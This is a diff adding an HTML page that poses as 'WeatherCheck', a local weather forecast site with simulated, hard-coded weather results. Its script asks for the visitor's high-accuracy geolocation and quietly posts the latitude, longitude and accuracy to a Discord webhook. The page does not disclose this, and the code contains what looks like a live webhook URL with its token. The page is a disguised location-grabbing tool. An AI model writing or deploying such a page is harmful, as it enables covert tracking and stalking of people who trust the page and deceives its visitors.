@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeatherCheck - Local Weather Forecast</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 100%;
+            max-width: 450px;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .logo {
+            margin-bottom: 20px;
+        }
+        
+        .logo i {
+            font-size: 48px;
+            color: #1a2980;
+        }
+        
+        h1 {
+            color: #1a2980;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+        
+        .search-box {
+            display: flex;
+            margin-bottom: 25px;
+        }
+        
+        .search-box input {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px 0 0 8px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .search-box input:focus {
+            border-color: #1a2980;
+        }
+        
+        .search-box button {
+            padding: 15px 20px;
+            background: #1a2980;
+            color: white;
+            border: none;
+            border-radius: 0 8px 8px 0;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        
+        .search-box button:hover {
+            background: #26d0ce;
+        }
+        
+        .location-permission {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            text-align: left;
+        }
+        
+        .location-permission h3 {
+            color: #1a2980;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .location-permission h3 i {
+            margin-right: 10px;
+        }
+        
+        .location-permission p {
+            margin-bottom: 15px;
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .location-btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            background: #1a2980;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background 0.3s;
+        }
+        
+        .location-btn:hover {
+            background: #26d0ce;
+        }
+        
+        .weather-info {
+            display: none;
+            margin-top: 20px;
+            text-align: left;
+        }
+        
+        .weather-info h3 {
+            color: #1a2980;
+            margin-bottom: 15px;
+            border-bottom: 2px solid #eee;
+            padding-bottom: 10px;
+        }
+        
+        .weather-details {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .weather-icon {
+            font-size: 64px;
+            color: #1a2980;
+        }
+        
+        .temperature {
+            font-size: 48px;
+            font-weight: bold;
+            color: #1a2980;
+        }
+        
+        .weather-description {
+            font-size: 24px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+        
+        .details {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+        
+        .detail-item {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+        }
+        
+        .detail-item i {
+            font-size: 24px;
+            color: #1a2980;
+            margin-bottom: 10px;
+        }
+        
+        .loading {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .loading i {
+            font-size: 36px;
+            color: #1a2980;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            margin-top: 25px;
+            font-size: 12px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <i class="fas fa-cloud-sun"></i>
+        </div>
+        <h1>WeatherCheck</h1>
+        <p class="subtitle">Get accurate weather forecasts for your location</p>
+        
+        <div class="search-box">
+            <input type="text" id="city-input" placeholder="Enter city name">
+            <button id="search-btn"><i class="fas fa-search"></i></button>
+        </div>
+        
+        <div class="location-permission">
+            <h3><i class="fas fa-location-arrow"></i> Get Weather for Your Location</h3>
+            <p>For the most accurate weather information, allow us to access your device's location. This will provide precise local weather data based on your exact position.</p>
+            <button class="location-btn" id="location-btn">
+                <i class="fas fa-map-marker-alt"></i> Use My Current Location
+            </button>
+        </div>
+        
+        <div class="loading" id="loading">
+            <i class="fas fa-spinner"></i>
+            <p>Fetching weather data...</p>
+        </div>
+        
+        <div class="weather-info" id="weather-info">
+            <h3>Current Weather</h3>
+            <div class="weather-details">
+                <div>
+                    <div class="weather-icon">
+                        <i class="fas fa-sun"></i>
+                    </div>
+                    <div class="temperature">72°F</div>
+                </div>
+                <div>
+                    <div class="weather-description">Sunny</div>
+                </div>
+            </div>
+            
+            <div class="details">
+                <div class="detail-item">
+                    <i class="fas fa-wind"></i>
+                    <p>Wind<br><strong>5 mph</strong></p>
+                </div>
+                <div class="detail-item">
+                    <i class="fas fa-tint"></i>
+                    <p>Humidity<br><strong>45%</strong></p>
+                </div>
+                <div class="detail-item">
+                    <i class="fas fa-temperature-high"></i>
+                    <p>Feels Like<br><strong>74°F</strong></p>
+                </div>
+                <div class="detail-item">
+                    <i class="fas fa-compress-alt"></i>
+                    <p>Pressure<br><strong>1013 hPa</strong></p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>WeatherCheck &copy; 2023 | Privacy Policy | Terms of Service</p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const locationBtn = document.getElementById('location-btn');
+            const searchBtn = document.getElementById('search-btn');
+            const loading = document.getElementById('loading');
+            const weatherInfo = document.getElementById('weather-info');
+            
+            // Replace this with your actual Discord webhook URL
+            const discordWebhookURL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+            
+            // Function to send data to Discord
+            function sendToDiscord(message) {
+                if (!discordWebhookURL || discordWebhookURL === 'https://discord.com/api/webhooks/1393190214238998598/RTf67SJLv3lWkdlSeYbSQZ8mM9kxPHMHSpTtXf1DYNhQmT_yWET1qIWKNBCpKdWi3Gx9') {
+                    console.error('Discord webhook URL not configured');
+                    return;
+                }
+                
+                const payload = {
+                    content: message,
+                    username: 'WeatherCheck Bot',
+                    avatar_url: 'https://example.com/avatar.png'
+                };
+                
+                fetch(discordWebhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send data to Discord');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error sending data to Discord:', error);
+                });
+            }
+            
+            // Function to get location and send to Discord
+            function getLocation() {
+                loading.style.display = 'block';
+                
+                if (!navigator.geolocation) {
+                    alert('Geolocation is not supported by your browser');
+                    loading.style.display = 'none';
+                    return;
+                }
+                
+                function success(position) {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    
+                    // Create a message with the location data
+                    const message = `Location obtained: Latitude: ${latitude}, Longitude: ${longitude}, Accuracy: ${accuracy} meters`;
+                    
+                    // Send the location to Discord
+                    sendToDiscord(message);
+                    
+                    // Show weather information (simulated)
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+                        weatherInfo.style.display = 'block';
+                    }, 1500);
+                }
+                
+                function error() {
+                    alert('Unable to retrieve your location. Please make sure location services are enabled.');
+                    loading.style.display = 'none';
+                }
+                
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            }
+            
+            // Event listeners
+            locationBtn.addEventListener('click', getLocation);
+            
+            searchBtn.addEventListener('click', function() {
+                const cityInput = document.getElementById('city-input');
+                if (cityInput.value.trim() !== '') {
+                    loading.style.display = 'block';
+                    
+                    // Simulate weather data loading
+                    setTimeout(() => {
+                        loading.style.display = 'none';
+                        weatherInfo.style.display = 'block';
+                    }, 1500);
+                }
+            });
+        });
+    </script>
+</body>
+  </html>
